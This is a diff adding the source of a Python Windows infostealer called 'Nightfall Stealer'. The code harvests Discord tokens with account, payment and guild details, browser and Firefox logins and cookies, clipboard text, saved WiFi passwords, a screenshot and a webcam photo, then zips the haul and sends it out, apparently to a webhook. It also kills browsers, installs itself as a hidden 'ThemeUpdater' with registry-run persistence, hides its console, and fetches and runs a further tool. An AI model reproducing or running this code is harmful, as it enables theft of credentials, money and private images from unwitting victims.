+        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
+        *[str(p) for p in Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")).glob("Profile *")],
+        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
+        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default"),
+    ]
+    tokens = set()
+    for base in possible_paths:
+        leveldb = os.path.join(base, "Local Storage", "leveldb")
+        if not os.path.isdir(leveldb):
+            continue
+        for ext in ("*.ldb", "*.log"):
+            for file in Path(leveldb).rglob(ext):
+                try:
+                    raw = file.read_bytes()
+                    text = raw.decode("utf-8", errors="ignore")
+                    for match in re.finditer(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{38,}(?:_[\w-]{22})?|mfa\.[\w-]{80,84}|eyJ[A-Za-z0-9_-]{60,400}", text):
+                        t = match.group(0).strip()
+                        if len(t) >= 59:
+                            tokens.add(t)
+                except:
+                    pass
+    tokens = {t for t in tokens if '.' in t and not t.startswith("eyJ")}
+    if not tokens:
+        send_embed("discord tokens", "no tokens found on this device", 0xff0000)
+        return
+    send_embed(f"Tokens Found — {len(tokens)}", f"**{len(tokens)}** token(s) located", 0x191919, fields=[
+        {"name": "Computer", "value": f"`{os.environ.get('COMPUTERNAME','Unknown')}`", "inline": True},
+        {"name": "User", "value": f"`{os.environ.get('USERNAME','Unknown')}`", "inline": True},
+        {"name": "IP", "value": f"`{get_ip()}`", "inline": True},
+    ])
+    for token in tokens:
+        info = get_user_info(token)
+        if not info:
+            continue
+        disp = f"{info.get('global_name', '')} (@{info['username']})" if info.get('global_name') else info["username"]
+        nitro_type = {0: "None", 1: "Classic", 2: "Full Nitro"}.get(info.get("premium_type", 0), "Unknown")
+        mfa = "Yes" if info.get("mfa_enabled") else "No"
+        created = snowflake_to_date(info["id"])
+        thumb = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.webp?size=512" if info.get("avatar") else None
+        banner = f"https://cdn.discordapp.com/banners/{info['id']}/{info['banner']}.webp?size=1024" if info.get("banner") else None
+        badges = []
+        flags = info.get("public_flags", 0)
+        if flags & 1: badges.append("Staff")
+        if flags & 2: badges.append("Partner")
+        if flags & 4: badges.append("HypeSquad Events")
+        if flags & 64: badges.append("HypeSquad Bravery")
+        if flags & 128: badges.append("HypeSquad Brilliance")
+        if flags & 256: badges.append("HypeSquad Balance")
+        if flags & 512: badges.append("Early Supporter")
+        if flags & 16384: badges.append("Bug Hunter Gold")
+        if flags & 262144: badges.append("Certified Moderator")
+        if flags & 4194304: badges.append("Active Developer")
+        badges_str = ", ".join(badges) if badges else "None"
+        decos = info.get("avatar_decoration_data") or info.get("avatar_decorations")
+        deco_count = len(decos) if isinstance(decos, list) else (1 if decos else 0)
+        subs = get_nitro_subscriptions(token)
+        has_nitro = len(subs) > 0
+        nitro_expires = datetime.fromisoformat(subs[0]["current_period_end"].replace("Z", "+00:00")).strftime("%d/%m/%Y %H:%M") if has_nitro else "N/A"
+        slots = get_boost_slots(token)
+        avail_boost = 0
+        boost_lines = []
+        for slot in slots:
+            if not slot.get("cooldown_ends_at") or datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00")) < datetime.now(timezone.utc):
+                avail_boost += 1
+                boost_lines.append("Available now")
+            else:
+                dt = datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00"))
+                boost_lines.append(f"Cooldown until {dt.strftime('%d/%m/%Y %H:%M')}")
+        payments = get_payment_sources(token)
+        pay_count = len(payments)
+        valid_pays = sum(1 for p in payments if not p.get("invalid"))
+        pay_types = " ".join("CC" if p["type"] == 1 else "PP" if p["type"] == 2 else "?" for p in payments)
+        guilds = get_guilds(token)
+        guild_count = len(guilds)
+        admin_guilds = []
+        for g in guilds:
+            perms = int(g.get("permissions", "0"))
+            if perms & (0x8 | 0x20):
+                cnt = g.get("approximate_member_count", "?")
+                line = f"ㅤ- {g['name']} ({cnt})"
+                if g.get("vanity_url_code"):
+                    line += f" • .gg/{g['vanity_url_code']}"
+                admin_guilds.append(line)
+        admin_text = "\n".join(admin_guilds) if admin_guilds else "None"
+        fields = [
+            {"name": "token", "value": f"```ansi\n\u001b[0;31m{token}\u001b[0m```", "inline": False},
+            {"name": "user", "value": f"**{disp}**", "inline": True},
+            {"name": "ID", "value": f"`{info['id']}`", "inline": True},
+            {"name": "created", "value": created, "inline": True},
+            {"name": "nitro type", "value": nitro_type, "inline": True},
+            {"name": "MFA", "value": mfa, "inline": True},
+            {"name": "badges", "value": badges_str, "inline": False},
+            {"name": "decos", "value": f"**{deco_count}** deco(s)", "inline": True},
+            {"name": "guilds", "value": f"{guild_count} total\nAdmin in:\n{admin_text}", "inline": False},
+            {"name": "nitro details", "value": f"Has Nitro: {has_nitro}\nExpires: {nitro_expires}\nBoosts: {avail_boost}\n" + "\n".join(boost_lines), "inline": False},
+            {"name": "payments", "value": f"Methods: {pay_count}\nValid: {valid_pays}\nTypes: {pay_types}", "inline": False},
+            {"name": "locale", "value": info.get("locale", "Unknown"), "inline": True},
+            {"name": "verified", "value": "Yes" if info.get("verified") else "No", "inline": True},
+        ]
+        if info.get("email"):
+            fields.append({"name": "email", "value": f"`{info['email']}`", "inline": True})
+        if info.get("phone"):
+            fields.append({"name": "phone", "value": f"`{info['phone']}`", "inline": True})
+        send_embed("account details", "", 0x191919, fields=fields, thumbnail=thumb, image=banner)
+
+def steal_clipboard():
+    try:
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+        win32clipboard.CloseClipboard()
+        if data and len(data) > 3:
+            lines = [data[i:i+120] for i in range(0, len(data), 120)]
+            send_full_txt("Clipboard Content", lines)
+    except:
+        pass
+
+def steal_wifi():
+    try:
+        data = subprocess.getoutput('netsh wlan show profiles')
+        profiles = re.findall(r'All User Profile\s+:\s+(.*)', data)
+        lines = []
+        for profile in profiles:
+            profile = profile.strip()
+            pwd_data = subprocess.getoutput(f'netsh wlan show profile name="{profile}" key=clear')
+            pwd = re.search(r'Key Content\s+:\s+(.*)', pwd_data)
+            pwd = pwd.group(1) if pwd else "no password for this wifi network"
+            lines.append(f"{profile} → {pwd}")
+        send_full_txt("WiFi Passwords", lines)
+    except:
+        pass
+
+def take_screenshot():
+    try:
+        img = pyautogui.screenshot()
+        path = os.path.join(WORK_DIR, f"screenshot_{random.randint(10000,99999)}.png")
+        img.save(path)
+        with open(path, "rb") as f:
+            files = {"file": (os.path.basename(path), f)}
+            send_embed("desktop screenshot", "sent", 0x191919, files=files)
+    except:
+        pass
+
+def take_webcam():
+    try:
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        if not cap.isOpened():
+            cap = cv2.VideoCapture(0)
+        time.sleep(1.2)
+        ret, frame = cap.read()
+        cap.release()
+        if ret:
+            path = os.path.join(WORK_DIR, f"webcam_{random.randint(10000,99999)}.jpg")
+            cv2.imwrite(path, frame)
+            with open(path, "rb") as f:
+                files = {"file": (os.path.basename(path), f)}
+                send_embed("webcam photo sent", 0x191919, files=files)
+    except:
+        pass
+
+def create_final_zip():
+    if not os.listdir(WORK_DIR):
+        send_embed("nightfall complete package", "no data collected.", 0x191919)
+        return
+    zip_name = f"nightfall_full_{random.randint(10000,99999)}.zip"
+    zip_path = os.path.join(TEMP, zip_name)
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
+        for root, _, files in os.walk(WORK_DIR):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, WORK_DIR).replace("\\", "/")
+                zipf.write(file_path, arcname)
+    with open(zip_path, "rb") as f:
+        files = {"file": (zip_name, f, "application/zip")}
+        send_embed("nightfall full archive", "all of the fuckn shit combined in a zip", 0x191919, files=files)
+    try:
+        os.remove(zip_path)
+    except:
+        pass
+
+def hide_file(file_path):
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)  
+    except:
+        pass
+
+def add_silent_startup():
+    persist_dir = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Themes")
+    persist_path = os.path.join(persist_dir, "themeupdater.exe")
+    
+    try:
+        os.makedirs(persist_dir, exist_ok=True)
+        
+        current_exe = sys.executable
+        if os.path.abspath(current_exe) != os.path.abspath(persist_path):
+            if os.path.exists(persist_path):
+                try:
+                    os.remove(persist_path)
+                except:
+                    pass
+            shutil.copy2(current_exe, persist_path)
+        
+        hide_file(persist_path)
+        
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
+                         r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                         0, reg.KEY_SET_VALUE)
+        
+        reg.SetValueEx(key, "ThemeUpdater", 0, reg.REG_SZ, persist_path)
+        reg.CloseKey(key)
+        
+    except:
+        pass
+
+def main():
+    subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe /im operagx.exe /im firefox.exe >nul 2>&1", shell=True)
+    send_embed("Nightfall Stealer Started")
+    threading.Thread(target=download_and_run_chromelevator, daemon=True).start()
+    threads = [
+        threading.Thread(target=steal_discord_tokens, daemon=True),
+        threading.Thread(target=steal_browser_data, daemon=True),
+        threading.Thread(target=steal_firefox_data, daemon=True),
+        threading.Thread(target=steal_clipboard, daemon=True),
+        threading.Thread(target=steal_wifi, daemon=True),
+        threading.Thread(target=take_screenshot, daemon=True),
+        threading.Thread(target=take_webcam, daemon=True),
+    ]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    time.sleep(12)
+    create_final_zip()
+    try:
+        shutil.rmtree(WORK_DIR, ignore_errors=True)
+    except:
+        pass
+    send_embed("nightfall stealer finished", color=0x191919)
+
+def get_firefox_profiles():
+    profiles = []
+    base_path = os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles")
+    if not os.path.exists(base_path):
+        return profiles
+    for item in os.listdir(base_path):
+        profile_path = os.path.join(base_path, item)
+        if os.path.isdir(profile_path):
+            profiles.append(profile_path)
+    return profiles
+
+def decrypt_firefox_passwords(profile_path):
+    lines = []
+    try:
+        logins_path = os.path.join(profile_path, "logins.json")
+        if not os.path.exists(logins_path):
+            return lines
+        with open(logins_path, "r", encoding="utf-8") as f:
+            data = json_loads(f.read())
+        for login in data.get("logins", []):
+            url = login.get("hostname", "")
+            username = login.get("username", "")
+            password = login.get("password", "")
+            if url or username or password:
+                lines.append(f"URL: {url}\nUser: {username}\nPass: {password}\n{'─'*70}")
+    except:
+        pass
+    return lines
+
+def steal_firefox_cookies(profile_path):
+    lines = []
+    try:
+        cookies_path = os.path.join(profile_path, "cookies.sqlite")
+        if not os.path.exists(cookies_path):
+            return lines
+        tmp = os.path.join(WORK_DIR, f"ff_cookies_{random.randint(10000,99999)}.db")
+        shutil.copy2(cookies_path, tmp)
+        conn = sql_connect(tmp)
+        cur = conn.cursor()
+        cur.execute("SELECT host, name, value FROM moz_cookies")
+        for host, name, value in cur.fetchall():
+            lines.append(f"Domain: {host} | Name: {name} | Value: {value}")
+        conn.close()
+        os.remove(tmp)
+    except:
+        pass
+    return lines
+
+def steal_firefox_data():
+    pw_lines = []
+    cookie_lines = []
+    profiles = get_firefox_profiles()
+    for prof in profiles:
+        pw_lines.extend(decrypt_firefox_passwords(prof))
+        cookie_lines.extend(steal_firefox_cookies(prof))
+    
+    if pw_lines:
+        send_full_txt("Firefox Passwords", pw_lines)
+    if cookie_lines:
+        send_full_txt("Firefox Cookies", cookie_lines)
+
+if __name__ == "__main__":
+    add_silent_startup()          
+    hide_file(sys.executable)
+    
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+    except:
+        pass
+    
+    main()
